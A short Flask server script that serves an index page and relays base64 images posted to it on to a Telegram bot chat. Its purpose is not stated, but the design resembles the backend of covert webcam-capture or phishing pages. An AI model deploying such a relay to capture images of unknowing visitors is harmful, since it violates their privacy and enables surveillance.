import os
from flask import Flask, request, send_from_directory
import base64, requests

app = Flask(__name__)

# Read from Render Environment Variables
BOT_TOKEN = os.environ.get("BOT_TOKEN")
CHAT_ID = os.environ.get("CHAT_ID")

@app.route("/")
def home():
    return send_from_directory(".", "index.html")

@app.route("/send", methods=["POST"])
def send():
    try:
        data = request.json["image"]
        img_bytes = base64.b64decode(data.split(",")[1])

        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        r = requests.post(
            url,
            data={"chat_id": CHAT_ID},
            files={"photo": img_bytes}
        )

        print("Telegram:", r.text)
        return "OK"
    except Exception as e:
        print("ERROR:", e)
        return "ERROR", 500
